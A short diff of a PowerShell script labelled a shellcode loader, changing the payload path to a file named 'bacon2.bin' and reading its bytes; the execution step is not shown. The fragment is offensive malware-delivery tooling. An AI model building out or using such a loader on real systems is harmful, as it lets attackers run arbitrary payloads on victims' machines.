@@ -1,6 +1,6 @@
 # PowerShell Shellcode Loader - Modified Version
 
-$shellcodePath = "C:\Users\w11vi\Downloads\ps-loader.ps1" # REPLACE THIS WITH YOUR ACTUAL PATH
+$shellcodePath = "C:\Users\w11vi\Downloads\bacon2.bin"
 
 try {
     $shellcode = [IO.File]::ReadAllBytes($shellcodePath)
